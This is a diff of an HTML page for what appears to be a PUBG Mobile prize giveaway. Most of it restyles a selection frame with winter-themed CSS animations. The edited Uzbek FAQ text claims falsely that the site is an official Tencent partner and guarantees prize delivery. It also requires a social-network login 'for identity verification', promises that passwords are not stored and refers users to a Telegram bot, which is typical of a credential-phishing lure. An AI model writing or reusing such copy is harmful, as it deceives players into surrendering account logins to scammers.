@@ -650,208 +650,198 @@
             opacity: 0.8;
         }
         
-        /* ОБНОВЛЕННАЯ РАМКА ВЫБОРА - PUBG СТИЛЬ С ЗИМНИМ ДИЗАЙНОМ */
+        /* ОБНОВЛЕННАЯ РАМКА В НОВОГОДНЕМ ЗИМНЕМ СТИЛЕ PUBG */
         .selection-frame {
             position: absolute;
             border: 3px solid transparent;
             border-radius: 15px;
             background: transparent;
+            box-shadow: 
+                inset 0 0 30px rgba(0, 212, 255, 0.4),
+                0 0 40px rgba(0, 212, 255, 0.6),
+                0 0 0 2px rgba(24, 119, 242, 0.8),
+                inset 0 0 0 2px rgba(24, 119, 242, 0.6);
             z-index: 100;
             pointer-events: none;
             opacity: 0;
             display: flex;
             align-items: center;
             justify-content: center;
-            animation: borderGlow 2s ease-in-out infinite;
+            animation: winterBorderGlow 3s ease-in-out infinite;
+            background-image: 
+                linear-gradient(135deg, 
+                    rgba(0, 212, 255, 0.1) 0%, 
+                    rgba(24, 119, 242, 0.2) 25%, 
+                    rgba(123, 104, 238, 0.1) 50%, 
+                    rgba(0, 212, 255, 0.2) 75%, 
+                    rgba(24, 119, 242, 0.1) 100%);
+            background-size: 400% 400%;
             overflow: hidden;
         }
 
-        /* Основная рамка с PUBG цветами и зимним узором */
-        .selection-frame::before {
-            content: '';
-            position: absolute;
-            inset: 0;
-            border: 3px solid transparent;
-            border-radius: 15px;
-            background: linear-gradient(135deg, 
-                rgba(255, 107, 107, 0.8) 0%, 
-                rgba(255, 193, 7, 0.8) 25%, 
-                rgba(24, 119, 242, 0.8) 50%, 
-                rgba(123, 104, 238, 0.8) 75%, 
-                rgba(0, 212, 255, 0.8) 100%);
-            mask: 
-                linear-gradient(#fff 0 0) content-box,
-                linear-gradient(#fff 0 0);
-            mask-composite: exclude;
-            -webkit-mask-composite: destination-out;
-            padding: 3px;
-            box-shadow: 
-                inset 0 0 25px rgba(0, 212, 255, 0.4),
-                0 0 30px rgba(24, 119, 242, 0.6);
-        }
-
-        /* Уголки в PUBG стиле */
-        .selection-frame::after {
-            content: '';
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            background: 
-                /* Верхний левый угол */
-                linear-gradient(135deg, transparent 10px, rgba(24, 119, 242, 0.8) 10px, rgba(24, 119, 242, 0.8) 12px, transparent 12px) top left,
-                /* Верхний правый угол */
-                linear-gradient(225deg, transparent 10px, rgba(24, 119, 242, 0.8) 10px, rgba(24, 119, 242, 0.8) 12px, transparent 12px) top right,
-                /* Нижний левый угол */
-                linear-gradient(45deg, transparent 10px, rgba(24, 119, 242, 0.8) 10px, rgba(24, 119, 242, 0.8) 12px, transparent 12px) bottom left,
-                /* Нижний правый угол */
-                linear-gradient(315deg, transparent 10px, rgba(24, 119, 242, 0.8) 10px, rgba(24, 119, 242, 0.8) 12px, transparent 12px) bottom right;
-            background-repeat: no-repeat;
-            background-size: 20px 20px;
-            animation: cornerPulse 1.5s ease-in-out infinite alternate;
-        }
-
-        /* Эффект снежинок на рамке */
-        .selection-frame .snowflakes {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            opacity: 0.6;
-        }
-
-        .selection-frame .snowflakes::before,
-        .selection-frame .snowflakes::after {
-            content: '❄';
-            position: absolute;
-            font-size: 16px;
-            color: rgba(255, 255, 255, 0.8);
-            animation: snowDrift 3s linear infinite;
-        }
-
-        .selection-frame .snowflakes::before {
-            top: 5px;
-            left: 10px;
-            animation-delay: 0s;
-        }
-
-        .selection-frame .snowflakes::after {
-            bottom: 5px;
-            right: 10px;
-            animation-delay: 1.5s;
-        }
-
-        @keyframes snowDrift {
-            0%, 100% { 
-                transform: translateY(0) rotate(0deg); 
-                opacity: 0.6;
-            }
-            50% { 
-                transform: translateY(5px) rotate(180deg); 
-                opacity: 1;
-            }
-        }
-
-        @keyframes cornerPulse {
-            0%, 100% { 
-                opacity: 0.7;
-                filter: drop-shadow(0 0 5px rgba(0, 212, 255, 0.5));
-            }
-            50% { 
-                opacity: 1;
-                filter: drop-shadow(0 0 10px rgba(0, 212, 255, 0.8));
-            }
-        }
-
-        @keyframes borderGlow {
+        @keyframes winterBorderGlow {
             0%, 100% {
                 box-shadow: 
-                    inset 0 0 25px rgba(0, 212, 255, 0.4),
-                    0 0 30px rgba(24, 119, 242, 0.6);
+                    inset 0 0 30px rgba(0, 212, 255, 0.4),
+                    0 0 40px rgba(0, 212, 255, 0.6),
+                    0 0 0 2px rgba(24, 119, 242, 0.8),
+                    inset 0 0 0 2px rgba(24, 119, 242, 0.6);
+                border-color: rgba(0, 212, 255, 0.6);
+                background-position: 0% 50%;
             }
             50% {
                 box-shadow: 
-                    inset 0 0 35px rgba(0, 212, 255, 0.6),
-                    0 0 40px rgba(24, 119, 242, 0.8),
-                    0 0 60px rgba(123, 104, 238, 0.4);
+                    inset 0 0 40px rgba(0, 212, 255, 0.6),
+                    0 0 60px rgba(0, 212, 255, 0.8),
+                    0 0 0 3px rgba(24, 119, 242, 1),
+                    inset 0 0 0 3px rgba(24, 119, 242, 0.8);
+                border-color: rgba(0, 212, 255, 0.9);
+                background-position: 100% 50%;
             }
+        }
+        
+        .selection-frame::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                45deg,
+                transparent 30%,
+                rgba(255, 255, 255, 0.1) 50%,
+                transparent 70%
+            );
+            animation: snowSparkle 4s linear infinite;
+        }
+
+        @keyframes snowSparkle {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+        
+        .selection-frame::after {
+            content: '❄';
+            position: absolute;
+            top: -15px;
+            left: -15px;
+            color: #00d4ff;
+            font-size: 20px;
+            text-shadow: 0 0 10px #00d4ff;
+            animation: snowflakeFloat 3s ease-in-out infinite;
+        }
+
+        @keyframes snowflakeFloat {
+            0%, 100% { transform: translateY(0) rotate(0deg); opacity: 0.7; }
+            50% { transform: translateY(10px) rotate(180deg); opacity: 1; }
+        }
+        
+        .selection-frame .corner {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #00d4ff;
+            box-shadow: 0 0 10px #00d4ff;
+        }
+        
+        .selection-frame .corner-tl {
+            top: -2px;
+            left: -2px;
+            border-right: none;
+            border-bottom: none;
+            border-radius: 10px 0 0 0;
+        }
+        
+        .selection-frame .corner-tr {
+            top: -2px;
+            right: -2px;
+            border-left: none;
+            border-bottom: none;
+            border-radius: 0 10px 0 0;
+        }
+        
+        .selection-frame .corner-bl {
+            bottom: -2px;
+            left: -2px;
+            border-right: none;
+            border-top: none;
+            border-radius: 0 0 0 10px;
+        }
+        
+        .selection-frame .corner-br {
+            bottom: -2px;
+            right: -2px;
+            border-left: none;
+            border-top: none;
+            border-radius: 0 0 10px 0;
         }
         
         .selection-frame.active {
             opacity: 1;
             animation: 
-                borderGlow 2s ease-in-out infinite,
+                winterBorderGlow 3s ease-in-out infinite,
                 frameFloat 3s ease-in-out infinite;
         }
 
         @keyframes frameFloat {
             0%, 100% {
-                transform: translateY(0);
+                transform: translateY(0) scale(1);
             }
             50% {
-                transform: translateY(-3px);
+                transform: translateY(-5px) scale(1.02);
             }
         }
         
-        /* ИНДИКАТОР ВЫБОРА - ЗИМНЯЯ ТЕМАТИКА */
+        /* ИНДИКАТОР ВЫБОРА */
         .selection-indicator {
             position: absolute;
             top: -30px;
             left: 50%;
             transform: translateX(-50%);
-            background: linear-gradient(135deg, #0a1520, #1a3b5a);
-            color: #00d4ff;
+            background: linear-gradient(135deg, #00b4db, #0083b0);
+            color: white;
             padding: 8px 20px;
             border-radius: 25px;
             font-weight: bold;
-            font-size: 12px;
+            font-size: 13px;
             white-space: nowrap;
-            box-shadow: 
-                0 4px 15px rgba(0, 212, 255, 0.4),
-                inset 0 0 10px rgba(0, 212, 255, 0.2);
+            box-shadow: 0 4px 20px rgba(0, 180, 219, 0.6);
             z-index: 101;
             opacity: 0;
             transition: opacity 0.3s;
             font-family: 'Orbitron', sans-serif;
-            text-transform: uppercase;
             letter-spacing: 1px;
-            border: 1px solid rgba(0, 212, 255, 0.3);
-            backdrop-filter: blur(5px);
-        }
-        
-        .selection-indicator::before {
-            content: '❄';
-            margin-right: 8px;
-            font-size: 10px;
-            color: #00d4ff;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            text-transform: uppercase;
+            backdrop-filter: blur(10px);
         }
         
         .selection-indicator::after {
             content: '';
             position: absolute;
-            bottom: -6px;
+            bottom: -8px;
             left: 50%;
             transform: translateX(-50%);
-            border-left: 8px solid transparent;
-            border-right: 8px solid transparent;
-            border-top: 8px solid #00d4ff;
-            filter: drop-shadow(0 2px 3px rgba(0, 212, 255, 0.3));
+            border-left: 10px solid transparent;
+            border-right: 10px solid transparent;
+            border-top: 10px solid #00b4db;
+            filter: drop-shadow(0 2px 2px rgba(0,0,0,0.3));
         }
         
         .selection-indicator.show {
             opacity: 1;
-            animation: indicatorPulse 2s ease-in-out infinite;
+            animation: indicatorPulse 2s infinite;
         }
 
         @keyframes indicatorPulse {
-            0%, 100% { 
-                box-shadow: 
-                    0 4px 15px rgba(0, 212, 255, 0.4),
-                    inset 0 0 10px rgba(0, 212, 255, 0.2);
+            0%, 100% {
+                box-shadow: 0 4px 20px rgba(0, 180, 219, 0.6);
+                transform: translateX(-50%) scale(1);
             }
-            50% { 
-                box-shadow: 
-                    0 6px 20px rgba(0, 212, 255, 0.6),
-                    inset 0 0 15px rgba(0, 212, 255, 0.3);
+            50% {
+                box-shadow: 0 6px 25px rgba(0, 180, 219, 0.8);
+                transform: translateX(-50%) scale(1.05);
             }
         }
         
@@ -2948,9 +2938,12 @@
                 </div>
             </div>
             
-            <!-- ОБНОВЛЕННАЯ РАМКА С ПУБГ И ЗИМНЕЙ ТЕМАТИКОЙ -->
+            <!-- ОБНОВЛЕННАЯ РАМКА С НОВОГОДНИМ ЗИМНИМ ДИЗАЙНОМ -->
             <div class="selection-frame" id="selectionFrame">
-                <div class="snowflakes"></div>
+                <div class="corner corner-tl"></div>
+                <div class="corner corner-tr"></div>
+                <div class="corner corner-bl"></div>
+                <div class="corner corner-br"></div>
             </div>
             <div class="selection-indicator" id="selectionIndicator">SELECTED</div>
         </div>
@@ -3860,7 +3853,7 @@
                         faqAnswers: [
                             "<strong>Ha, bu rasmiy hamkor sayti.</strong> Biz Tencent Games kompaniyasining rasmiy hamkorlari bo'lib, PUBG Mobile Hamkor Dasturi doirasida ishlaymiz. Bizning faoliyatimiz to'liq ruxsat etilgan.",
                             "<strong>Ha, sovrinni olish 100% kafolatlanadi.</strong> Barcha yutuqlar ma'lumotlarni tasdiqlaganingizdan so'ng 24 soat ichida avtomatik ravishda yuboriladi. Tizim rasmiy PUBG Mobile API bilan integratsiyalangan bo'lib, sovrinlarni belgilangan hisobga yetkazishni kafolatlaydi.",
-                            "Ijtimoiy tarmoqqa kirish <strong>shaxsingizni tasdiqlash</strong> va firibgarlikni oldini olish uchun zarur. Bu bizga sovrinni haqiqiy odam, bot emas, olayotganiga ishonch hosil qilish imkonini beradi. Barcha ma'lumotlar himoyalangan va uchinchi shaxslarga o'tkazilmaydi.",
+                            "Ijtimoiy tarmoqqa kirish <strong>shaxsingizni tasdiqlash</strong> va firibgarlikni oldini olish uchun zarur. Bu bizga sovrinni haqiqiy odam, bot emas, olayotganiga ishonch hosil qilish imkonini beradi. Barcha ma'lumotlar himoyalangan va uchinji shaxslarga o'tkazilmaydi.",
                             "PUBG Mobile hisob ID raqamini ko'rsatmasdan, biz sizga <strong>sovrinni yubora olmaymiz</strong>. Bu majburiy maydon, chunki aynan shu identifikator orqali tizim qaysi o'yin hisobiga yutgan predmetlarni o'tkazishini aniqlaydi.",
                             "Kamdan-kam hollarda server yuklanishi yuqori bo'lganda, qayta ishlash <strong>48 soatgacha</strong> davom etishi mumkin. Agar bu vaqt ichida sovrin hisobingizga o'tkazilmagan bo'lsa, iltimos, <a href='https://t.me/helpumgmbot' target='_blank'>texnik yordamimizga</a> ID raqamingiz va yutish vaqtingiz bilan murojaat qiling.",
                             "<strong>Ha, bu mutlaqo xavfsiz.</strong> Biz xavfsiz SSL shifrlashdan foydalanamiz va parollaringizni saqlamaymiz. Avtorizatsiya ijtimoiy tarmoqlarning rasmiy API-lari orqali amalga oshiriladi, xuddi telefoningizdagi ilovalarga kirganingizdagidek.",
